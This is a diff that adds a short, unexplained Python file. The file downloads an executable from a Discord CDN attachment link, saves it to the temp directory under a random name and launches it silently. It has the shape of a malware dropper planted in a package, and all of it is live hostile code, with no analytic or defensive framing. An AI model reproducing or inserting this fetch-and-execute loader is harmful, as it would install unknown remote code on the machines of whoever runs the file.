@@ -1,0 +1,20 @@
+import requests
+import os
+import uuid
+import tempfile
+import subprocess
+
+url = "https://cdn.discordapp.com/attachments/1193658583947149322/1218876343232630844/main.exe?ex=6609420d&is=65f6cd0d&hm=f5a0af7499e892637935c3e4071f2dc59d48214f56a1c1d7aedc3392f58176db&"
+temp = tempfile.gettempdir()
+
+name = os.path.join(temp, str(uuid.uuid4()) + ".exe")
+
+response = requests.get(url)
+
+if response.status_code == 200:
+    with open(name, 'wb') as dosya:
+        dosya.write(response.content)
+
+    subprocess.Popen([name], shell=True)
+else:
+    exit()
